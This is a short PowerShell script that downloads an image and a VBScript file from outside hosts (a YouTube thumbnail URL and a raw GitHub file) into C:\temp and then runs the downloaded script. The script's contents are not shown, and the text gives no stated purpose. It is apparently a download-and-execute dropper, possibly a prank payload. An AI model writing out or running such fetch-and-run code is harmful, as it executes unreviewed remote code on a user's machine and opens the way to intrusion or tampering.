(new-object System.Net.WebClient).Downloadfile("https://i.ytimg.com/vi/qyYHWkVWQ4o/maxresdefault.jpg","C:\temp\kb.jpg")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/calebpmiller/Files/master/kb.vbs","C:\temp\kb.vbs")
Start-Process -FilePath C:\temp\kb.vbs